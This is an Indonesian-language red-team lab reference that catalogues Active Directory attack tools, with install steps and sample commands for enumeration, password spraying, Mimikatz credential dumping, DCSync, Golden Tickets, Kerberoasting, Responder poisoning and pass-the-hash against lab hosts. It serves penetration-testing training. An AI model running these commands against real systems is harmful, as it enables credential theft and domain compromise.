# 🛠️ Daftar Tool Red Team

## Gambaran Umum

Dokumen ini mencakup semua tool yang digunakan dalam lab beserta penjelasan fungsi, fase penggunaan, dan cara instalasi di Kali Linux.

---

## 1. BloodHound

**Fungsi:** Visualisasi dan analisis attack path di Active Directory.

**Fase:** Enumerasi & Analisis

**Penjelasan:** BloodHound mengumpulkan data tentang user, group, session, ACL, dan trust di Active Directory, lalu menampilkannya sebagai graph database. Ini memungkinkan attacker (dan defender) melihat jalur terpendek dari user biasa ke Domain Admin, menemukan ACL misconfiguration, dan mengidentifikasi akun overprivileged.

**Instalasi:**
```bash
sudo apt install bloodhound neo4j -y
# Start neo4j: sudo neo4j start
# Akses: http://localhost:7474 (ganti default password)
# Jalankan: bloodhound
```

**Penggunaan Khas:**
```bash
# Collect data menggunakan bloodhound-python
pip3 install bloodhound
bloodhound-python -u "user" -p "pass" -d "corp.local" -ns 192.168.56.10 -c All --zip
# Import .zip ke BloodHound GUI
```

---

## 2. SharpHound

**Fungsi:** Data collector untuk BloodHound (dijalankan di mesin Windows target).

**Fase:** Enumerasi

**Penjelasan:** SharpHound adalah versi .NET dari collector BloodHound. Dijalankan langsung di mesin Windows yang sudah tergabung domain untuk mengumpulkan data lebih lengkap (terutama session data). Hasilnya berupa file JSON/ZIP yang di-import ke BloodHound.

**Download:** https://github.com/BloodHoundAD/SharpHound/releases

**Penggunaan:**
```powershell
# Di mesin Windows target
.\SharpHound.exe -c All --zipfilename data.zip
```

---

## 3. Impacket

**Fungsi:** Kumpulan tool Python untuk berinteraksi dengan protokol jaringan Windows (SMB, LDAP, Kerberos, WMI, dll.).

**Fase:** Multi-fase (Enumerasi, Credential Access, Lateral Movement, Persistence)

**Penjelasan:** Impacket adalah swiss army knife untuk pentesting Windows dari Linux. Tool-tool yang sering digunakan:

| Script           | Fungsi                                 |
|------------------|----------------------------------------|
| `GetNPUsers`     | AS-REP Roasting                        |
| `GetUserSPNs`    | Kerberoasting                          |
| `secretsdump`    | Credential dumping (DCSync, SAM, LSA)  |
| `psexec`         | Remote shell via SMB                   |
| `wmiexec`        | Remote shell via WMI                   |
| `smbexec`        | Remote shell via SMB                   |
| `smbclient`      | Akses SMB share                        |
| `atexec`         | Remote execution via Scheduled Task    |
| `ticketer`       | Membuat Golden/Silver Ticket           |
| `lookupsid`      | SID brute forcing untuk enumerasi user |
| `findDelegation` | Mencari delegation configuration       |

**Instalasi:**
```bash
sudo apt install python3-impacket impacket-scripts -y
# Atau install dari pip untuk versi terbaru
pip3 install impacket
```

---

## 4. CrackMapExec (NetExec)

**Fungsi:** Tool automasi untuk pentesting Active Directory — scanning, spraying, execution, enumeration.

**Fase:** Multi-fase

**Penjelasan:** CrackMapExec (sekarang NetExec) memungkinkan operasi massal terhadap banyak mesin sekaligus. Sangat berguna untuk password spraying, cek akses admin, enumerasi share, dan eksekusi remote command.

**Instalasi:**
```bash
sudo apt install crackmapexec -y
# Atau versi terbaru (NetExec)
pip3 install netexec
```

**Penggunaan Umum:**
```bash
# Password spraying
crackmapexec smb 192.168.56.10 -u users.txt -p "Welcome2024!" --continue-on-success

# Cek admin access
crackmapexec smb 192.168.56.0/24 -u "admin" -p "pass" --local-auth

# Enumerasi shares
crackmapexec smb 192.168.56.20 -u "user" -p "pass" --shares

# Dump SAM
crackmapexec smb 192.168.56.30 -u "admin" -p "pass" --sam

# Remote command execution
crackmapexec smb 192.168.56.10 -u "admin" -p "pass" -x "whoami"
```

---

## 5. Mimikatz

**Fungsi:** Ekstraksi credential dari memori Windows (password, hash, Kerberos ticket).

**Fase:** Credential Access, Privilege Escalation, Lateral Movement, Persistence

**Penjelasan:** Mimikatz adalah tool paling terkenal untuk credential theft di Windows. Tool ini membaca memori proses LSASS untuk mengekstrak password plaintext, NTLM hash, dan Kerberos ticket. Juga digunakan untuk membuat Golden/Silver Ticket.

**Download:** https://github.com/gentilkiwi/mimikatz/releases

**Penggunaan (di mesin Windows sebagai admin):**
```powershell
# Aktifkan debug privilege
mimikatz.exe "privilege::debug"

# Dump semua credential dari memori
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Dump hash SAM
mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

# DCSync
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" "exit"

# Golden Ticket
mimikatz.exe "kerberos::golden /user:admin /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt" "exit"
```

---

## 6. Rubeus

**Fungsi:** Tool .NET untuk serangan Kerberos (dijalankan di mesin Windows).

**Fase:** Credential Access, Lateral Movement

**Penjelasan:** Rubeus adalah alternatif Mimikatz yang fokus pada serangan Kerberos. Mendukung Kerberoasting, AS-REP Roasting, ticket extraction, Pass-the-Ticket, dan overpass-the-hash.

**Download:** https://github.com/GhostPack/Rubeus (perlu compile dengan Visual Studio)

**Penggunaan:**
```powershell
# Kerberoasting
.\Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP Roasting
.\Rubeus.exe asreproast /outfile:asrep.txt

# Dump ticket dari memori
.\Rubeus.exe dump

# Monitor ticket baru (untuk unconstrained delegation)
.\Rubeus.exe monitor /interval:5

# Request TGT menggunakan hash (overpass-the-hash)
.\Rubeus.exe asktgt /user:s.admin /rc4:<hash> /ptt
```

---

## 7. Responder

**Fungsi:** LLMNR/NBT-NS/mDNS poisoner — menangkap NTLMv2 hash dari jaringan.

**Fase:** Credential Access

**Penjelasan:** Responder memanfaatkan protokol name resolution fallback di Windows. Ketika DNS gagal, Windows menggunakan LLMNR/NBT-NS yang broadcast ke jaringan lokal. Responder menjawab broadcast ini dan menangkap NTLMv2 hash dari client.

**Instalasi:**
```bash
sudo apt install responder -y
```

**Penggunaan:**
```bash
# Jalankan (harus sebagai root)
sudo responder -I eth0 -dwv

# Hash tersimpan di: /usr/share/responder/logs/
# Crack dengan hashcat
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 8. enum4linux / enum4linux-ng

**Fungsi:** Enumerasi SMB dan NetBIOS — user, group, share, policy.

**Fase:** Enumerasi

**Instalasi:**
```bash
sudo apt install enum4linux enum4linux-ng -y
```

**Penggunaan:**
```bash
enum4linux -a 192.168.56.10
enum4linux-ng -A 192.168.56.10
```

---

## 9. ldapsearch

**Fungsi:** Query LDAP untuk enumerasi Active Directory secara detail.

**Fase:** Enumerasi

**Instalasi:** Biasanya sudah terinstal. Jika belum:
```bash
sudo apt install ldap-utils -y
```

**Penggunaan:**
```bash
# Enumerasi semua user
ldapsearch -x -H ldap://192.168.56.10 -D "user@corp.local" -w "pass" \
    -b "DC=corp,DC=local" "(objectClass=user)" cn sAMAccountName
```

---

## 10. smbclient

**Fungsi:** Akses dan browsing SMB share.

**Fase:** Enumerasi

**Instalasi:**
```bash
sudo apt install smbclient -y
```

**Penggunaan:**
```bash
# List shares
smbclient -L //192.168.56.20 -U "user%pass"

# Akses share
smbclient //192.168.56.20/IT -U "user%pass"
```

---

## 11. Evil-WinRM

**Fungsi:** Shell interaktif via WinRM protocol (port 5985/5986).

**Fase:** Lateral Movement

**Penjelasan:** Evil-WinRM menyediakan shell PowerShell interaktif melalui WinRM. Mendukung upload/download file, eksekusi .NET assembly, dan Pass-the-Hash.

**Instalasi:**
```bash
sudo apt install evil-winrm -y
```

**Penggunaan:**
```bash
# Login dengan password
evil-winrm -i 192.168.56.10 -u s.admin -p "P@ssw0rd123"

# Login dengan hash (Pass-the-Hash)
evil-winrm -i 192.168.56.10 -u s.admin -H "<ntlm_hash>"
```

---

## Mapping Tool ke Fase Serangan

```
┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│  ENUMERATION │    │  CREDENTIAL  │    │  PRIVILEGE   │    │   LATERAL    │    │ PERSISTENCE  │
│              │    │   ACCESS     │    │  ESCALATION  │    │  MOVEMENT    │    │              │
├──────────────┤    ├──────────────┤    ├──────────────┤    ├──────────────┤    ├──────────────┤
│ nmap         │    │ Responder    │    │ Mimikatz     │    │ psexec       │    │ schtasks     │
│ enum4linux   │    │ kerbrute     │    │ BloodHound   │    │ wmiexec      │    │ reg add      │
│ ldapsearch   │    │ GetNPUsers   │    │ Rubeus       │    │ Evil-WinRM   │    │ sc.exe       │
│ smbclient    │    │ GetUserSPNs  │    │ CrackMapExec │    │ CrackMapExec │    │ Golden Ticket│
│ BloodHound   │    │ secretsdump  │    │              │    │ smbclient    │    │              │
│ CrackMapExec │    │ CrackMapExec │    │              │    │ PtH / PtT    │    │              │
│ SharpHound   │    │ Mimikatz     │    │              │    │ DCSync       │    │              │
└──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
```
